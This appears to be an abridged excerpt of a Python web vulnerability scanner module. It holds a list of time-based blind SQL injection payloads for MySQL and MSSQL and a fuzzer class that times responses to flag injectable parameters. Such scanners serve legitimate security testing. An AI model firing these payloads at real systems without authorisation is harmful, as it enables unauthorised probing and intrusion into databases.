...
base_payloads = {
    "mysql": [  # from arachni
        "sleep(%s)", " or sleep(%s) and 1=1", " or sleep(%s) -- 1",
        "' or sleep(%s) and '1'='1", "' or sleep(%s) -- 1",
        '" or sleep(%s) and "1"="1', '" or sleep(%s) -- 1', "`,sleep(%s),`id",
        ",sleep(%s)", "',sleep(%s),'1", "` where sleep(%s) -- 1",
        " where sleep(%s) -- 1"
    ],
    ...
    "mssql": [  # from arachni
        " and sleep(%s)", " or sleep(%s) # 1", "' and sleep(%s)='",
        "' and sleep(%s) # 1", '" and sleep(%s)="', "' or sleep(%s) # 1",
        '" or sleep(%s) # 1', "'=sleep(%s)='", '"=sleep(%s)="',
        "' where sleep(%s) # 1"
    ],
    "sqlite": []
}
...
class Sqli_blind(BaseFuzzer):
    ...
    def verify(self, mutation, timing, prv_timing):
        mutation.set_parameter(mutation.parameter,
                               [mutation.payload[0], timing])
    ...
    def fuzz(self):
        ...
        for m in mutations:
            ...
            try:
                ...
                self.sprint("Redirect IGNORED (%s): %s" %
            ...
            if tottime > self.curtiming:
                verified = "VERIFIED" if self.verify(m, self.curtiming +
                                                     2, self.curtiming) else ""
                #print "\n  \033[31mFound: %s %s\n  %s\033[0m" % (m.payload[0] % m.payload[1], verified, m.url)
                self.vulnerabilities.append(
                    "%s=%s  %s %s" %
                    (m.parameter, m.payload, m.body, verified))
